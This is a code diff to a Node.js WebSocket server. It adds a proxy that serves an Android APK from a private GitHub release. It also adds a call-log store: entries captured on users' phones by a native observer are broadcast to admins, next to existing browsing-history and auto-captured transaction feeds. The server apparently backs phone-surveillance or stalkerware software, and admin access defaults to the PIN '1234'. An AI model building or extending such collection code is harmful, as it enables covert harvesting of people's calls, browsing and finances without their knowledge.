@@ -1,6 +1,7 @@
 const http = require('http')
 const fs   = require('fs')
 const path = require('path')
+const { Readable } = require('stream')
 const { WebSocketServer, WebSocket } = require('ws')
 const { AccessToken } = require('livekit-server-sdk')
 const { ProxyAgent, setGlobalDispatcher } = require('undici')
@@ -13,9 +14,25 @@ if (outboundProxy) setGlobalDispatcher(new ProxyAgent(outboundProxy))
 
 const ADMIN_PIN   = process.env.ADMIN_PIN || '1234'
 const CLIENT_DIR  = path.join(__dirname, '../client/dist')
-const APP_VERSION = process.env.APP_VERSION || '1.0.0'
-const APK_URL     = `https://github.com/dailycoder09/apkformobile/releases/latest/download/meeee.apk`
 const MAX_FILE_MB = 200
+
+// Auto-update: the repo is private, so the client never gets a GitHub token — the server
+// looks up the latest release and proxies the actual APK download itself.
+const GITHUB_TOKEN = process.env.GITHUB_TOKEN || ''
+const GITHUB_REPO  = 'dailycoder09/apkformobile'
+let releaseCache = { data: null, fetchedAt: 0 }
+const RELEASE_CACHE_TTL = 5 * 60 * 1000
+
+async function fetchLatestRelease() {
+  if (releaseCache.data && Date.now() - releaseCache.fetchedAt < RELEASE_CACHE_TTL) return releaseCache.data
+  const res = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/releases/tags/latest-build`, {
+    headers: { Authorization: `token ${GITHUB_TOKEN}`, Accept: 'application/vnd.github.v3+json' },
+  })
+  if (!res.ok) throw new Error(`GitHub API ${res.status}`)
+  const data = await res.json()
+  releaseCache = { data, fetchedAt: Date.now() }
+  return data
+}
 
 // In-memory file store: requestId → { data, mime, name, adminId, fromUserId }
 // Auto-expires after 10 minutes
@@ -321,10 +338,45 @@ const server = http.createServer(async (req, res) => {
       return
     }
 
-    // Version check endpoint for auto-update
+    // Version check endpoint for auto-update — looks up the real latest GitHub release
+    // (repo is private, so this can't just be a static env var or a public download link)
     if (urlPath === '/api/version') {
-      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' })
-      res.end(JSON.stringify({ version: APP_VERSION, apkUrl: APK_URL }))
+      try {
+        const release = await fetchLatestRelease()
+        const versionName = (release.body || '').match(/versionName:\s*(\S+)/)?.[1] || release.tag_name
+        // Absolute URL — the native app's WebView serves its own bundled assets from a local
+        // origin, so a relative path here would NOT resolve to this server.
+        const apkUrl = `https://${req.headers.host}/api/app-download`
+        res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' })
+        res.end(JSON.stringify({ version: versionName, apkUrl }))
+      } catch (e) {
+        res.writeHead(502, { 'Content-Type': 'application/json' })
+        res.end(JSON.stringify({ error: e.message }))
+      }
+      return
+    }
+
+    // Streams the actual APK bytes through this server so the client never needs a
+    // GitHub token or a private-repo URL.
+    if (urlPath === '/api/app-download') {
+      try {
+        const release = await fetchLatestRelease()
+        const asset = release.assets?.find(a => a.name === 'meeee.apk')
+        if (!asset) { res.writeHead(404); res.end('APK asset not found'); return }
+        const assetRes = await fetch(asset.url, {
+          headers: { Authorization: `token ${GITHUB_TOKEN}`, Accept: 'application/octet-stream' },
+        })
+        if (!assetRes.ok || !assetRes.body) { res.writeHead(502); res.end('Failed to fetch APK'); return }
+        res.writeHead(200, {
+          'Content-Type': 'application/vnd.android.package-archive',
+          'Content-Disposition': 'attachment; filename="meeee.apk"',
+          ...(asset.size ? { 'Content-Length': asset.size } : {}),
+        })
+        Readable.fromWeb(assetRes.body).pipe(res)
+      } catch (e) {
+        res.writeHead(502, { 'Content-Type': 'application/json' })
+        res.end(JSON.stringify({ error: e.message }))
+      }
       return
     }
 
@@ -347,6 +399,7 @@ const users        = new Map()   // userId → { ws, userId, name }
 const byWs         = new Map()   // ws → meta
 const transactions = new Map()   // userId → transaction[]
 const browsingHistory = new Map() // userId → { id, domain, timestamp, userId, userName }[]
+const callLogs = new Map()        // userId → { id, number, name, type, duration, date, userId, userName }[]
 
 let idSeq = 0
 function makeId() { return `${++idSeq}-${Math.random().toString(36).slice(2, 6)}` }
@@ -490,6 +543,13 @@ wss.on('connection', (ws) => {
         return
       }
 
+      // ── Admin commands ── call log ───────────────────
+      if (meta.role === 'admin' && msg.type === 'call_log_get') {
+        const list = callLogs.get(msg.userId) || []
+        send(ws, { type: 'call_log_list', userId: msg.userId, entries: list })
+        return
+      }
+
       // ── User messages ───────────────────────────────
       if (meta.role === 'user') {
         // Transaction added by user (manual or auto-captured) — store + broadcast to admins.
@@ -544,6 +604,16 @@ wss.on('connection', (ws) => {
           if (!browsingHistory.has(uid)) browsingHistory.set(uid, [])
           browsingHistory.get(uid).unshift(entry)
           broadcastToAdmins({ type: 'browsing_new', entry, fromUserId: uid, fromUserName: meta.name })
+          return
+        }
+
+        // Call log entry captured by the native ContentObserver — store + broadcast to admins.
+        if (msg.type === 'call_log_add') {
+          const uid = meta.isBg ? meta.primaryId : meta.userId
+          const entry = { ...msg.entry, userId: uid, userName: meta.name }
+          if (!callLogs.has(uid)) callLogs.set(uid, [])
+          callLogs.get(uid).unshift(entry)
+          broadcastToAdmins({ type: 'call_log_new', entry, fromUserId: uid, fromUserName: meta.name })
           return
         }
 
